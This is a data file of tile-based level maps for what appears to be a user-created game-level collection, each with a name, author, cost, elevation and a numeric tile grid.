maps.push({name="DEATH RAY WITH A",author="Fara",id="#1662898320",direction="forward",cost=124,elevation=-15,map=[0,0,1,24,24,24,24,2,2,24,24,24,24,1,0,0,0,0,0,0,0,0,1,24,24,24,24,24,24,24,24,24,24,1,0,0,0,0,0,0,0,0,1,0,0,44,42,40,38,36,34,34,34,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,34,34,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,34,34,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,34,34,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,34,34,1,0,0,0,0,0,0,0,0,1,34,34,35,35,35,35,35,35,34,34,1,0,0,0,0,0,0,0,0,1,34,34,35,35,35,35,35,35,34,34,1,0,0,0,0,0,0,0,0,1,34,34,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,97,34,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,34,34,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,96,96,19,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,34,34,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,33,33,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,32,32,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,31,31,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,30,30,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,29,29,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,2,2,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0]});
maps.push({name="AS SOON AS I FIGURE",author="Fara",id="#1662898352",direction="left",cost=310,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,38,38,38,96,38,97,38,38,38,38,38,24,58,118,118,58,58,58,58,1,2,38,38,96,38,38,38,90,38,90,90,24,58,58,58,58,58,90,58,1,2,38,38,96,38,38,38,38,38,38,38,24,58,58,58,90,58,58,58,1,38,38,38,23,38,38,38,90,38,90,38,24,24,24,24,24,58,58,24,1,0,0,0,23,0,0,0,38,38,38,90,38,38,90,38,90,38,38,38,1,0,0,0,0,0,0,0,0,38,38,38,38,90,38,90,90,90,38,38,1,1,1,1,1,0,0,0,0,0,38,38,38,38,90,38,38,38,38,90,1,1,1,1,1,0,0,0,0,0,0,38,38,38,38,38,38,90,38,38,1,1,1,1,1,25,90,25,90,25,25,24,24,24,58,58,24,24,24,0,1,1,1,1,1,25,25,25,25,25,25,105,25,25,92,58,58,58,24,0,1,25,25,90,25,25,90,25,25,90,25,105,58,58,58,58,58,58,24,0,1,25,25,25,90,25,25,90,25,25,25,24,58,58,58,58,58,58,24,0,1,25,97,25,25,25,25,0,0,0,0,24,24,24,24,24,24,24,24,0,1,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="OUT HOW TO TAP INTO",author="Fara",id="#1662898371",direction="forward",cost=260,elevation=12,map=[0,0,0,0,0,0,0,1,1,2,2,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,112,112,112,112,112,1,58,58,58,58,58,1,0,0,0,0,0,0,0,1,52,52,52,52,52,118,58,58,58,58,58,1,0,0,0,0,0,0,0,1,52,52,32,52,52,118,58,58,38,58,58,1,0,0,0,0,0,0,0,1,52,52,32,52,52,118,58,58,38,58,58,1,0,0,0,0,0,0,0,1,52,52,33,52,52,118,58,58,39,58,58,1,0,0,0,0,0,0,0,1,52,52,33,52,52,118,58,58,39,58,58,1,0,0,0,0,0,0,0,1,52,52,34,52,52,118,58,58,40,58,58,1,0,0,0,0,0,0,0,1,52,52,34,52,52,118,58,58,40,58,58,1,0,0,0,0,0,0,0,1,52,52,35,52,52,118,58,58,41,58,58,1,0,0,0,0,0,0,0,1,52,52,35,52,52,118,58,58,41,58,58,1,0,0,0,0,0,0,0,1,52,52,36,52,52,118,58,58,42,58,58,1,0,0,0,0,0,0,0,1,52,52,36,52,52,118,58,58,42,58,58,1,0,0,0,0,0,0,0,1,52,52,37,52,52,118,58,58,43,58,58,1,0,0,0,0,0,0,0,1,52,52,37,52,52,118,58,58,43,58,58,1,0,0,0,0,0,0,0,1,52,52,38,52,52,118,58,58,44,58,58,1,0,0,0,0,0,0,0,1,52,52,52,52,52,118,58,58,58,58,58,1,0,0,0,0,0,0,0,1,52,52,52,52,52,118,58,58,58,58,58,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,24,24,24,24,24,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,2,2,1,1]});
maps.push({name="THE MAIN REACTORS I",author="Fara",id="#1662898385",direction="right",cost=251,elevation=-3,map=[1,21,2,2,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,21,41,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,21,41,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,20,40,40,0,0,43,0,0,0,0,0,0,0,0,0,0,0,0,1,1,20,40,40,0,0,42,41,0,0,0,0,0,0,0,0,0,0,0,1,1,19,39,39,0,0,0,41,40,0,0,0,0,0,0,0,0,0,0,1,1,19,39,39,0,0,0,0,40,0,0,0,0,0,0,0,0,0,0,1,1,18,38,38,0,0,0,0,39,38,38,38,38,38,38,38,0,0,0,1,1,18,38,38,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,1,1,18,38,38,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,1,1,18,38,38,37,37,37,37,38,38,18,18,18,18,18,38,38,0,0,1,1,18,38,38,0,0,0,0,38,38,18,1,1,1,18,38,38,38,38,1,1,18,38,38,37,37,37,37,38,38,18,1,0,1,18,38,38,38,96,2,1,18,38,38,0,0,0,0,38,38,18,1,0,1,18,38,38,38,96,2,1,18,38,38,37,37,37,37,38,38,18,1,0,1,18,18,18,97,18,1,1,18,38,38,0,0,0,0,38,38,18,1,0,1,1,1,1,1,1,1,1,18,38,38,38,38,38,38,38,38,18,1,0,0,0,0,0,0,0,1,1,18,38,38,38,38,38,38,38,38,18,1,0,0,0,0,0,0,0,1,1,18,18,18,18,18,18,18,18,18,18,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="WILL BURN THE WORLD",author="Fara",id="#1662898401",direction="forward",cost=258,elevation=7,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,5,5,5,5,5,5,5,105,105,105,105,5,5,5,5,5,5,5,1,1,25,25,5,5,5,5,5,5,5,5,5,5,5,5,5,5,25,25,1,1,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,26,1,1,26,0,0,39,37,0,100,0,0,0,0,100,0,37,39,0,0,26,1,1,27,0,0,0,0,0,36,0,0,0,0,36,0,0,0,0,0,27,1,1,27,39,0,0,35,0,1,1,1,1,1,1,0,35,0,0,39,27,1,1,28,41,0,0,0,0,1,0,0,0,0,1,0,0,0,41,0,28,1,1,28,0,0,0,0,0,1,0,0,0,0,1,0,34,0,0,0,28,1,1,29,0,0,0,35,0,1,0,0,0,0,1,0,0,0,0,0,29,1,1,29,41,0,42,35,0,1,0,0,0,0,1,0,0,41,0,0,29,1,1,30,0,0,0,34,0,1,0,0,0,0,1,0,34,0,0,0,30,1,1,30,0,0,0,0,42,1,1,1,1,1,1,42,0,0,0,0,30,1,1,31,0,0,0,33,0,0,0,0,0,0,0,0,33,0,0,0,31,1,1,31,31,0,0,0,0,42,0,0,0,0,0,43,0,0,0,31,31,1,1,32,32,32,32,0,0,0,44,0,0,0,44,100,44,32,32,32,32,1,1,32,32,32,32,32,32,44,100,0,0,0,0,32,32,32,32,32,32,1,1,32,32,32,32,65,32,32,32,32,32,32,32,32,65,32,32,32,32,1,1,32,32,32,32,32,32,32,112,112,112,112,32,32,32,32,32,32,32,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1]});
maps.push({name="enjoy the circus",author="iProbie",id="#1662899363",direction="left",cost=456,elevation=0,map=[25,2,2,25,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,0,0,0,144,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,144,0,0,0,144,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,144,0,0,0,144,144,144,144,144,144,144,144,144,144,144,144,144,144,25,25,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,25,25,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,25,25,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,25,25,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,25,25,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,25,25,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,25,25,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,25,25,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,25,25,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,25,25,144,0,25,25,144,144,144,144,144,144,144,144,144,144,144,144,144,144,25,25,144,0,2,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,144,0,2,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,144,0,25,25,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Descent",author="tormacoy",id="#1662904178",direction="forward",cost=118,elevation=-9,map=[0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,13,13,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,13,13,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,12,12,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,12,12,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,11,11,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,11,11,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,10,10,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,10,10,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,9,9,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,9,9,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,8,8,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,8,8,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,7,7,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,7,7,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,6,6,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,6,6,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,5,5,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0]});
maps.push({name="Mountain hike",author="Luffaren",id="#1662905447",direction="left",cost=308,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,5,5,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,90,5,5,5,5,5,90,0,0,0,0,0,0,0,0,14,90,9,141,5,5,5,90,5,5,5,5,0,0,0,0,0,0,0,14,14,9,9,9,9,141,5,5,5,5,5,5,0,0,0,0,0,14,14,14,141,9,9,90,9,5,5,5,5,94,5,90,0,0,0,0,19,141,14,90,14,90,9,9,9,9,141,5,5,5,5,0,0,0,0,0,19,19,14,14,14,141,9,9,90,9,5,5,90,5,0,0,0,0,0,0,90,19,141,14,90,14,141,9,9,9,141,9,9,0,0,0,0,0,0,0,19,19,19,141,14,14,14,141,9,9,9,90,9,0,0,0,0,0,1,0,19,90,19,19,141,14,90,14,14,141,9,9,0,0,0,0,0,1,0,1,19,19,19,90,19,141,14,14,90,14,0,0,0,0,0,0,0,1,0,0,1,90,19,19,19,19,19,141,14,90,0,0,0,0,0,0,0,0,1,0,0,1,141,19,90,19,90,19,90,19,0,0,0,0,0,0,0,0,1,0,0,1,24,141,19,19,19,90,19,141,19,0,0,0,0,0,0,1,0,0,0,1,24,24,24,141,19,19,141,24,24,0,0,0,0,0,0,1,0,1,1,5,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,5,1,65,65,5,24,24,24,24,24,24,24,24,24,24,44,44,44,0,0,2,5,65,65,65,5,24,24,89,24,24,89,24,24,24,44,44,44,44,93,2,5,65,65,65,5,3,24,24,24,24,24,24,24,24,0,0,0,0,0,5,5,5,5,5,5,0,24,24,24,24,24,24,0,0,0,0,0,0,0]});
maps.push({name="BUNKER ENDING",author="ZpLit",id="#1662905547",direction="forward",cost=193,elevation=-2,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,10,10,19,19,143,18,18,52,19,19,10,10,0,0,0,0,0,0,0,0,10,19,0,54,52,52,52,52,54,0,19,10,0,0,0,0,0,0,0,1,10,19,54,54,52,52,52,52,54,54,19,10,1,0,0,0,0,0,0,0,10,143,52,52,52,52,52,52,52,52,52,10,0,0,0,0,0,0,0,0,10,18,52,52,52,52,52,52,52,52,18,10,0,0,0,0,0,0,0,0,10,18,52,52,52,52,52,52,52,52,18,10,0,0,0,0,0,0,0,0,10,52,52,52,52,52,52,52,52,52,143,10,0,0,0,0,0,0,0,1,10,19,54,54,52,95,95,52,54,54,19,10,1,0,0,0,0,0,0,0,10,19,0,54,20,12,12,20,54,0,19,10,0,0,0,0,0,0,0,0,10,10,19,19,19,11,11,19,19,19,10,10,0,0,0,0,0,0,0,0,0,10,10,10,18,10,10,18,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,17,9,9,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,8,8,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,8,8,8,8,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,88,2,2,88,16,0,0,0,0,0,0,0]});
maps.push({name="Creepy Crawly",author="ZpLit",id="#1662907677",direction="forward",cost=406,elevation=0,map=[0,0,0,0,0,0,12,12,12,2,2,12,12,12,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,142,1,142,1,142,1,142,1,142,142,1,142,1,142,1,142,1,142,1,1,142,1,142,1,142,1,142,1,142,142,1,142,1,142,1,142,1,142,1,1,142,1,142,1,142,1,142,1,142,142,1,142,1,142,1,142,1,142,1,1,142,1,142,1,142,1,142,1,142,142,1,142,1,142,1,142,1,142,1,1,142,1,142,1,142,1,142,1,142,142,1,142,1,142,1,142,1,142,1,1,142,1,142,1,142,1,142,1,142,142,1,142,1,142,1,142,1,142,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,0,12,12,12,12,12,12,2,2,12,12,12,12,12,12,0,0,0]});
maps.push({name="Waves",author="Tenzist",id="#1662910371",direction="forward",cost=328,elevation=-3,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,15,19,19,17,16,15,19,19,17,18,16,16,15,16,17,18,19,19,0,0,15,16,17,17,16,16,17,17,19,19,16,16,17,16,17,18,18,18,0,0,15,16,17,16,16,17,17,18,19,18,18,17,18,19,19,18,17,17,0,0,17,16,16,16,17,17,18,18,19,18,17,18,19,20,19,19,16,16,0,0,17,17,16,19,18,17,16,20,19,18,17,18,19,20,20,19,15,15,0,0,18,16,20,19,17,18,19,20,19,18,17,18,18,17,16,15,14,15,0,0,18,18,20,18,17,18,19,19,19,19,16,17,17,16,15,15,14,16,0,0,18,17,19,18,17,18,18,19,19,17,16,16,16,16,15,13,13,15,0,0,18,17,19,19,18,16,16,19,18,17,17,17,15,15,15,14,16,15,0,0,18,17,17,19,17,15,15,16,18,18,18,15,15,15,14,15,19,20,0,0,19,18,18,19,17,15,16,16,17,17,17,15,14,14,14,15,19,20,0,0,20,17,16,18,14,14,18,17,16,16,15,15,15,15,15,15,19,20,0,0,20,17,16,18,19,19,18,17,17,15,15,16,16,17,17,18,19,18,0,0,21,17,17,20,19,19,18,18,17,16,16,16,17,17,17,18,18,18,0,0,22,18,19,20,20,20,18,18,17,16,17,17,17,15,15,17,17,16,0,0,23,18,19,19,19,18,18,19,17,16,18,18,13,14,15,15,16,16,0,0,18,18,17,17,17,17,17,19,19,14,14,14,13,16,16,14,14,15,0,0,16,16,17,18,17,16,17,17,16,15,15,16,16,16,16,19,15,15,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="The last one",author="Tenzist",id="#1662913384",direction="left",cost=157,elevation=-9,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,131,13,14,3,9,9,9,14,14,14,14,14,0,0,0,0,0,0,0,13,13,13,14,3,9,132,9,14,5,5,5,14,0,0,0,0,0,0,0,13,131,13,14,3,9,9,9,0,5,134,5,0,0,0,0,0,0,0,0,13,13,13,14,0,0,0,0,0,5,5,5,94,0,0,0,0,0,0,0,13,131,13,14,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,13,13,13,14,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,13,131,13,14,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,13,13,13,14,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,13,131,13,14,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,13,13,13,14,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,13,131,13,14,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,13,13,13,14,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,13,131,13,14,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,13,13,13,14,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,13,131,13,14,0,0,0,0,2,5,5,0,0,0,0,0,0,0,0,0,13,13,13,14,0,0,0,0,2,5,5,0,0,0,0,0,0,0,0,0,13,133,13,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,14,0,0,0,0]});
maps.push({name="Breakable shortcut",author="Tenzist",id="#1662915038",direction="left",cost=86,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,2,19,129,14,91,91,91,14,4,19,19,0,0,0,0,0,0,0,0,0,2,19,19,14,91,91,91,14,4,19,19,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,93,24,19,19,0,0,0,0,0,0,0,0,0,0,19,24,24,24,24,24,24,24,19,19,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,19,24,19,24,19,24,19,24,19,19,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Where The Fuck Am I",author="ZpLit",id="#1662923550",direction="forward",cost=499,elevation=0,map=[0,1,1,1,0,1,1,1,0,2,2,0,1,1,1,0,1,1,1,0,1,133,14,131,1,133,14,131,1,14,14,1,136,14,138,1,136,14,138,1,1,14,14,14,1,14,14,14,1,14,14,1,14,14,14,1,14,14,14,1,1,131,14,132,1,131,14,132,1,14,14,1,137,14,136,1,137,14,136,1,0,1,1,1,0,1,1,1,94,14,14,94,1,1,1,0,1,1,1,0,1,133,14,131,1,133,14,131,1,14,14,1,136,14,138,1,136,14,138,1,1,14,14,14,1,14,100,14,1,14,14,1,14,100,14,1,14,14,14,1,1,131,14,132,1,134,14,132,1,14,14,1,137,14,136,1,137,14,136,1,0,1,1,1,0,1,1,1,131,14,14,136,1,1,1,0,1,1,1,0,93,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,93,93,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,93,0,1,1,1,0,1,1,1,131,14,14,136,1,1,1,0,1,1,1,0,1,131,14,132,1,131,14,132,1,14,14,1,137,14,136,1,137,14,136,1,1,14,14,14,1,14,100,14,1,14,14,1,14,100,14,1,14,14,14,1,1,133,14,131,1,133,14,131,1,14,14,1,136,14,138,1,136,14,138,1,0,1,1,1,0,1,1,1,134,14,14,139,1,1,1,0,1,1,1,0,1,131,14,132,1,131,14,132,1,14,14,1,137,14,136,1,137,14,136,1,1,14,14,14,1,14,14,14,1,14,14,1,14,14,14,1,14,14,14,1,1,133,14,131,1,133,14,131,1,14,14,1,136,14,138,1,136,14,138,1,0,1,1,1,0,1,1,1,88,2,2,88,1,1,1,0,1,1,1,0]});
maps.push({name="Get it Twisted",author="ZpLit",id="#1662925054",direction="right",cost=282,elevation=-15,map=[0,0,0,0,0,0,0,1,1,1,2,2,20,1,1,0,0,0,0,0,0,0,0,0,0,19,19,19,19,1,20,20,20,1,19,19,19,19,19,0,0,0,0,0,19,93,54,88,54,114,54,54,54,114,54,95,88,54,93,19,0,0,0,0,19,54,88,54,54,114,54,54,54,114,54,95,54,88,54,19,0,0,0,0,19,88,54,54,54,114,54,54,54,114,54,95,54,54,88,19,0,0,0,0,19,54,54,54,19,1,20,20,20,1,0,1,54,54,54,19,0,0,0,0,19,54,54,54,19,24,59,59,59,0,1,0,55,55,55,20,0,0,0,0,19,54,54,54,19,23,58,58,58,1,0,1,56,56,56,21,0,0,0,0,19,54,54,54,19,23,88,58,58,58,57,56,56,56,88,21,0,0,0,0,19,54,54,54,19,23,58,88,58,58,57,56,56,88,56,21,0,0,0,0,19,54,54,54,19,23,93,58,88,58,57,56,88,56,93,21,0,0,0,0,19,54,54,54,19,0,23,23,23,23,22,21,21,21,21,0,0,0,0,0,19,54,54,54,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,54,54,54,19,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,19,14,14,14,129,14,5,5,5,5,90,5,5,5,5,88,0,0,0,0,19,14,14,14,129,14,5,5,5,5,65,65,65,90,5,2,0,0,0,0,19,14,14,14,129,14,5,5,5,5,65,65,65,90,5,2,0,0,0,0,19,14,14,14,129,14,5,5,5,5,90,5,5,5,5,88,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="This is a Bossfight",author="ZpLit",id="#1662938452",direction="forward",cost=223,elevation=0,map=[0,0,0,0,0,0,0,9,9,2,2,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,93,9,9,93,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,95,95,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,49,90,49,49,49,49,14,0,0,0,0,0,0,0,0,0,0,0,14,94,49,49,49,49,49,90,94,14,0,0,0,0,0,0,0,0,0,14,49,49,90,75,75,75,75,49,49,49,14,0,0,0,0,0,0,0,0,14,90,49,75,75,88,88,75,75,49,90,14,0,0,0,0,0,0,0,14,49,49,49,75,88,9,9,88,75,49,49,49,14,0,0,0,0,0,0,14,49,49,90,75,88,9,9,88,75,90,49,49,14,0,0,0,0,0,0,0,14,49,49,75,75,88,88,75,75,49,49,14,0,0,0,0,0,0,0,0,14,90,49,49,75,75,75,75,49,49,90,14,0,0,0,0,0,0,0,0,0,14,94,49,49,49,49,90,49,94,14,0,0,0,0,0,0,0,0,0,0,0,14,49,90,49,49,49,49,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,95,95,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Just A Pond",author="sivi",id="#1662939303",direction="forward",cost=334,elevation=0,map=[0,0,0,0,0,0,1,1,1,2,2,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,90,90,14,14,90,90,1,0,0,0,0,0,0,0,0,0,0,0,0,1,24,14,14,14,14,24,1,0,0,0,0,0,0,0,0,0,0,0,1,1,90,90,14,14,90,90,1,1,0,0,0,0,0,0,0,0,0,1,1,90,24,14,14,14,14,24,90,1,1,0,0,0,0,0,0,0,0,1,24,90,90,14,14,14,14,90,24,24,1,0,0,0,0,0,0,0,0,1,90,90,14,14,14,14,14,14,90,90,1,0,0,0,0,1,1,1,1,1,24,88,14,90,65,65,90,14,88,24,1,1,1,1,1,1,105,94,1,1,90,14,90,65,65,65,65,90,14,90,1,1,94,105,1,1,93,105,105,141,14,14,65,65,65,65,65,65,14,14,141,105,105,93,1,1,93,105,105,141,14,14,65,65,65,65,65,65,14,14,141,105,105,93,1,1,105,94,1,1,90,14,90,65,65,65,65,90,14,90,1,1,94,105,1,1,1,1,1,1,24,88,14,90,65,65,90,14,88,24,1,1,1,1,1,0,0,0,0,1,90,90,14,14,14,14,14,14,90,90,1,0,0,0,0,0,0,0,0,1,24,24,90,14,14,14,14,90,90,24,1,0,0,0,0,0,0,0,0,1,1,90,90,14,14,14,14,24,24,1,1,0,0,0,0,0,0,0,0,0,1,1,90,90,14,14,90,90,1,1,0,0,0,0,0,0,0,0,0,0,0,1,24,14,14,14,14,24,1,0,0,0,0,0,0,0,0,0,0,0,0,1,90,90,14,14,90,90,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,2,2,1,1,1,0,0,0,0,0,0]});
